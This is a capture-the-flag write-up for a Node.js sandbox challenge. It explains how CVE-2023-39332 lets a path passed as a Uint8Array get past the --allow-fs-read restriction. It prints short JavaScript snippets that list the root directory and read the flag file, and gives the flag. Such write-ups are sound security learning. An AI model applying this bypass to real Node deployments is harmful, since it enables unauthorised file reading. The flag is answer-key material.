## 2023 Web Chal

<img src="images/chall.png" width=600>

We are given a simple webapp that provides us with a code sandbox.  

Our payload is run using Node.js with the `--experimental-permission` and `--allow-fs-read` flags, which restricts us to reading files only within the `/tmp` directory the sandbox creates.  

```js
const http = require('node:http');
const fs = require('node:fs');
const os = require('node:os');
const crypto = require('node:crypto');
const path = require('node:path');
const child_process = require('node:child_process');

http.createServer((req, res) => {
    const url = new URL('http://127.0.0.1:8080/' + req.url);
    const code = url.searchParams.get('code') ?? '';

    const randHex = crypto.randomBytes(32).toString('hex');
    const tmpPath = path.join(os.tmpdir(), randHex);
    fs.mkdirSync(tmpPath);
    const tmpCode = path.join(tmpPath, 'code.js');
    fs.writeFileSync(tmpCode, code);

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    try {
        const args = ['--experimental-permission', `--allow-fs-read=${tmpPath}`, tmpCode];
        const opts = {
            cwd: tmpPath,
            stdio: ['ignore', 'pipe', 'ignore'],
            timeout: 1000,
        };
        const proc = child_process.spawnSync('node', args, opts);
        res.write(proc.stdout);
    } catch { }
    res.end();

    fs.rmSync(tmpCode);
    fs.rmdirSync(tmpPath);
}).listen(8080, '0.0.0.0');
```

Looking at the Dockerfile, there is a flag file with a MD5 hash prefix in the root directory.  

Our goal would be thus be to get path traversal and enumerate the root directory to read the flag.  

```dockerfile
FROM node:20.7.0-alpine3.17@sha256:2d808029dd5a1e6a606c06a3c78fbb770f53d2603827e7fcfbc7878848749152

ENV USER ctf
ENV PORT 8080
ENV NODE_ENV production

# Change tmp permissions
RUN chmod 1733 /tmp /var/tmp /dev/shm

# Add user
RUN adduser -D -g "" $USER

# Add files
COPY --chown=root:ctf server.js flag /
RUN chmod 440 /flag /server.js \
 && mv /flag /flag_$(md5sum /flag | awk '{print $1}')

USER $USER
EXPOSE $PORT
CMD ["node", "/server.js"]
```

The challenge hints at a 2023 CVE, and `node:20.7.0` is known to have numerous CVEs in 2023 involving the `--experimental-permission` flag.  

The CVE we are concerned with is [CVE-2023-39332](https://nvd.nist.gov/vuln/detail/cve-2023-39332), which involves passing the filepath as `Uint8Array()` to bypass `--allow-fs-read` and achieve path traversal.  

We can use this exploit to traverse to the root directory and list all the files inside, which will reveal the flag file name.  

```js
const obf = s => new Uint8Array((new TextEncoder()).encode(s).buffer)
console.log(require('fs').readdirSync(obf(`${__dirname}/../../`)).join(' '))
```

<img src="images/flagpath.png" width=800>

Now that we know the full path of the flag file, we can finally read it.  

```js
const obf = s => new Uint8Array((new TextEncoder()).encode(s).buffer)
require('fs').readFileSync(obf(`${__dirname}/../../<flag path>`)).toString()
```

Flag: `DH{quite_simple_isn't_it?_96387903dcff81c4ff23ba13ba7c2f8500b0d01bb7ac46f03012ecc6af445f5b}`